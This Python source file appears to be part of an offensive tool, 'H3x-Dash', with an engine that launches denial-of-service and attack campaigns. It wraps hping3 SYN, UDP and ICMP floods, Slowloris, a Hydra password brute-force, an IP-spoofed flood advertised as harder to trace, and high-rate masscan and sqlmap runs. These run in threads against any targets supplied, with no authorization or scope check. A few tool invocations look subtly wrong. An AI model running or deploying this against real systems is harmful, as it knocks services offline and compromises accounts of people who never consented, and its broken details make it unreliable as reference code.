"""
H3x-Dash DoSEngine
Disruption dispatcher for training exercises. Implements network floods,
web exhaustion, and protocol-specific attacks. Selectable tool grid like enum.

Tool install reference (Kali):
    sudo apt-get install -y hping3 slowloris nmap hydra
"""

import json
import re
import shutil
import subprocess
import threading
from pathlib import Path

from config import H3xConfig


# ── Tool availability check ───────────────────────────────────────────────────

_KALI_PATHS = [
    '/usr/bin', '/usr/sbin',
    '/usr/local/bin', '/usr/local/sbin',
    '/bin', '/sbin',
    '/usr/games', '/usr/local/games',
]


def _which(tool: str) -> str | None:
    """Find a tool binary. Falls back to explicit Kali paths for sudo."""
    import os as _os

    found = shutil.which(tool)
    if found:
        return found

    for directory in _KALI_PATHS:
        candidate = _os.path.join(directory, tool)
        if _os.path.isfile(candidate) and _os.access(candidate, _os.X_OK):
            return candidate

    return None


# ── DoS Tool Definitions ──────────────────────────────────────────────────────
# Format: {tool_id: {'label': 'Display name', 'tier': 1|2|3,
#                    'description': 'What it does', 'category': 'Network'|'Web'|'Protocol'}}

TIER_RECON, TIER_STANDARD, TIER_DEEP = 1, 2, 3

DOS_TOOLS: dict[str, dict] = {
    # ── Network Layer Floods (Tier 1 Recon) ─────────────────────────────────────
    'hping3_syn_flood': {
        'label':       'hping3 SYN Flood',
        'tier':        TIER_RECON,
        'category':    'Network',
        'description': 'TCP SYN flood against target port (non-destructive)',
        'command':     ['hping3', '--syn', '--flood'],
        'params':      ['target_ip', 'target_port'],
        'default_port': 80,
    },
    'hping3_udp_flood': {
        'label':       'hping3 UDP Flood',
        'tier':        TIER_RECON,
        'category':    'Network',
        'description': 'UDP flood against target port',
        'command':     ['hping3', '--udp', '--flood'],
        'params':      ['target_ip', 'target_port'],
        'default_port': 53,
    },
    'hping3_icmp_flood': {
        'label':       'hping3 ICMP Flood',
        'tier':        TIER_RECON,
        'category':    'Network',
        'description': 'ICMP flood (ping of death style)',
        'command':     ['hping3', '--icmp', '--flood'],
        'params':      ['target_ip'],
        'default_port': 0,
    },
    # ── Web Application Exhaustion (Tier 2 Standard) ────────────────────────────
    'slowloris': {
        'label':       'Slowloris',
        'tier':        TIER_STANDARD,
        'category':    'Web',
        'description': 'HTTP header flood - holds connections open with partial requests',
        'command':     ['slowloris'],
        'params':      ['target_host', 'target_port'],
        'default_port': 80,
    },
    'hydra_http_post': {
        'label':       'Hydra HTTP-POST Flood',
        'tier':        TIER_STANDARD,
        'category':    'Web',
        'description': 'Brute-force login flood against web form (many requests/sec)',
        'command':     ['hydra', '-f', '-l', 'admin', '-P', '/usr/share/seclists/Passwords/Common-Credentials/rockyou.txt'],
        'params':      ['target_host', 'target_port', 'login_path'],
        'default_port': 80,
        'default_login_path': '/login',
    },
    # ── Protocol-Specific Attacks (Tier 2 Standard) ─────────────────────────────
    'nmap_script_ddos': {
        'label':       'Nmap DDOS Scripts',
        'tier':        TIER_STANDARD,
        'category':    'Protocol',
        'description': 'Run nmap --script ddos against target ports',
        'command':     ['nmap', '--script', 'ddos'],
        'params':      ['target_ip', 'ports'],
        'default_port': 80,
    },
    'dnsperf': {
        'label':       'DNSPerf Query Flood',
        'tier':        TIER_STANDARD,
        'category':    'Protocol',
        'description': 'Send high-volume DNS queries to target resolver',
        'command':     ['dnsperf'],
        'params':      ['target_ip', '-q', 'query_file'],
        'default_port': 53,
    },
    # ── Deep / Loud Attacks (Tier 3 Opt-In) ─────────────────────────────────────
    'nmap_spoof_flood': {
        'label':       'Nmap IP Spoof Flood',
        'tier':        TIER_DEEP,
        'category':    'Network',
        'description': 'IP-spoofed SYN flood (requires root, harder to trace)',
        'command':     ['nmap', '-S', 'spoof_ip', '--send-ip'],
        'params':      ['target_ip', 'spoof_ip'],
        'default_port': 80,
    },
    'masscan_syn_flood': {
        'label':       'Masscan SYN Flood',
        'tier':        TIER_DEEP,
        'category':    'Network',
        'description': 'High-speed SYN flood across ports (masscan rate-limited)',
        'command':     ['masscan', '--rate', '10000', '-p'],
        'params':      ['target_ip', 'ports'],
        'default_port': 80,
    },
    'sqlmap_injection_flood': {
        'label':       'SQLMap Injection Flood',
        'tier':        TIER_DEEP,
        'category':    'Web',
        'description': 'Complex SQL injection payloads (resource exhaustion)',
        'command':     ['sqlmap', '--risk', '3', '--level', '5', '--fuzz'],
        'params':      ['target_url'],
        'default_port': 80,
    },
}

# Tool labels for UI display
DOS_LABELS: dict[str, str] = {
    tool_id: info['label'] for tool_id, info in DOS_TOOLS.items()
}

# Category groupings for UI tool selectors
DOS_CATEGORIES: list[tuple[str, list[str]]] = [
    ('Network Floods', [
        'hping3_syn_flood',
        'hping3_udp_flood',
        'hping3_icmp_flood',
    ]),
    ('Web Exhaustion', [
        'slowloris',
        'hydra_http_post',
        'sqlmap_injection_flood',
    ]),
    ('Protocol Attacks', [
        'nmap_script_ddos',
        'dnsperf',
        'nmap_spoof_flood',
        'masscan_syn_flood',
    ]),
]

# Tool availability panel categories
DOS_AVAILABILITY_CATEGORIES: list[tuple[str, list[tuple[str, str]]]] = [
    ('Network Floods', [
        ('hping3',     'hping3'),
        ('masscan',    'masscan'),
    ]),
    ('Web Tools', [
        ('slowloris',  'Slowloris'),
        ('hydra',      'Hydra'),
        ('sqlmap',     'SQLMap'),
    ]),
    ('Protocol Tools', [
        ('dnsperf',    'DNSPerf'),
        ('nmap',       'Nmap (scripts)'),
    ]),
]

# ── State ─────────────────────────────────────────────────────────────────────

class DoSState:
    IDLE     = 'idle'
    RUNNING  = 'running'
    COMPLETE = 'complete'
    ERROR    = 'error'


# ── DoSEngine ────────────────────────────────────────────────────────────────

class DoSEngine:

    def __init__(self):
        self._state       = DoSState.IDLE
        self._results     = {}   # {target_ip: [result_dict, ...]}
        self._tool_status = {}   # {tool_id: 'pending'|'running'|'done'|'error'}
        self._lock        = threading.Lock()

    def start_dos(self, targets: list, tool_ids: list, params: dict,
                  on_output=None, on_complete=None) -> bool:
        """
        Start disruption campaign.
        
        Args:
            targets: List of target IPs/hosts
            tool_ids: Selected DoS tools to run
            params: Tool parameters (e.g., {'target_port': 80})
            on_output: Callback for live output streaming (optional)
            on_complete: Callback when all attacks finish (optional)
        """
        with self._lock:
            if self._state == DoSState.RUNNING:
                return False
            self._state       = DoSState.RUNNING
            self._results     = {}
            self._tool_status = {tool_id: 'pending' for tool_id in tool_ids}

        threading.Thread(
            target  = self._run,
            args    = (targets, tool_ids, params, on_output, on_complete),
            daemon  = True,
            name    = 'h3x-dos',
        ).start()
        return True

    def get_status(self) -> dict:
        """Get current DoS campaign status."""
        with self._lock:
            running_tools = sum(1 for s in self._tool_status.values() if s == 'running')
            done_tools = sum(1 for s in self._tool_status.values() if s == 'done')
        
        return {
            'state':         self._state,
            'tool_status':   dict(self._tool_status),
            'tools_running': running_tools,
            'tools_done':    done_tools,
            'total_tools':   len(self._tool_status),
        }

    def get_results(self) -> dict:
        """Get disruption results by target."""
        with self._lock:
            return dict(self._results)

    @staticmethod
    def available_tools() -> dict[str, bool]:
        """Check which DoS tools are installed on the system."""
        return {
            'hping3':       bool(_which('hping3')),
            'slowloris':    bool(_which('slowloris')),
            'hydra':        bool(_which('hydra')),
            'nmap':         bool(_which('nmap')),
            'masscan':      bool(_which('masscan')),
            'dnsperf':      bool(_which('dnsperf')),
            'sqlmap':       bool(_which('sqlmap')),
        }

    # ── Tool Runners ───────────────────────────────────────────────────────────

    def _run(self, targets: list, tool_ids: list, params: dict,
             on_output=None, on_complete=None):
        """Main execution loop - runs each tool against each target."""
        
        for tool_id in tool_ids:
            with self._lock:
                if self._state != DoSState.RUNNING:
                    break
                self._tool_status[tool_id] = 'running'
            
            tool_info = DOS_TOOLS.get(tool_id)
            if not tool_info:
                with self._lock:
                    self._tool_status[tool_id] = 'error'
                continue

            # Build command with parameters
            cmd = self._build_command(tool_id, params)

            for target in targets:
                # Execute the attack
                result = self._execute_attack(target, tool_id, cmd, on_output)
                
                with self._lock:
                    if target not in self._results:
                        self._results[target] = []
                    self._results[target].append(result)

            with self._lock:
                self._tool_status[tool_id] = 'done'

        # Final state
        with self._lock:
            all_done = all(s == 'done' for s in self._tool_status.values())
            if all_done and self._state == DoSState.RUNNING:
                self._state = DoSState.COMPLETE

        if on_complete:
            on_complete()

    def _build_command(self, tool_id: str, params: dict) -> list[str]:
        """Build command line with selected parameters."""
        base_cmd = DOS_TOOLS[tool_id]['command'].copy()
        
        # Insert target IP/host
        if 'target_ip' in params:
            base_cmd.append(params['target_ip'])
        elif 'target_host' in params:
            base_cmd.append(params['target_host'])

        # Insert port if required
        if 'target_port' in params and tool_id in ('hping3_syn_flood', 'slowloris'):
            base_cmd.extend(['-p', str(params['target_port'])])

        # Custom tool-specific params
        if tool_id == 'hydra_http_post':
            login_path = params.get('login_path', '/login')
            base_cmd.append(f'http-post-form://{login_path}')

        if tool_id == 'dnsperf':
            query_file = params.get('query_file', '/usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt')
            base_cmd.extend(['-q', query_file])

        return base_cmd

    def _execute_attack(self, target: str, tool_id: str, cmd: list[str],
                        on_output=None) -> dict:
        """Execute a single attack and capture results."""
        
        result = {
            'target':      target,
            'tool_id':     tool_id,
            'timestamp':   None,
            'success':     False,
            'output':      '',
            'duration_s':  0,
            'packets_sent': 0,
        }
        
        try:
            import time
            start_time = time.time()
            
            result['timestamp'] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))
            
            # Execute the command
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )
            
            # Stream output
            output_lines = []
            for line in iter(process.stdout.readline, ''):
                output_lines.append(line)
                if on_output:
                    on_output({'tool_id': tool_id, 'target': target, 'line': line.strip()})
            
            process.wait()
            elapsed = time.time() - start_time
            
            result['output'] = '\n'.join(output_lines)
            result['duration_s'] = round(elapsed, 2)
            result['success'] = process.returncode == 0 or process.returncode is None
            
            # Parse output for packet count if available
            output_text = result['output']
            match = re.search(r'(\d+)\s*(packets|bytes)', output_text, re.IGNORECASE)
            if match:
                result['packets_sent'] = int(match.group(1))
            
        except Exception as e:
            result['success'] = False
            result['output'] = f'Error: {str(e)}'
        
        return result


# ── Validation Functions ──────────────────────────────────────────────────────

def validate_target(target: str) -> bool:
    """Basic target validation - IP or hostname format."""
    import re as _re
    # IP address
    if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        return True
    # Hostname (simple check)
    if _re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-\.]+$', target):
        return True
    return False
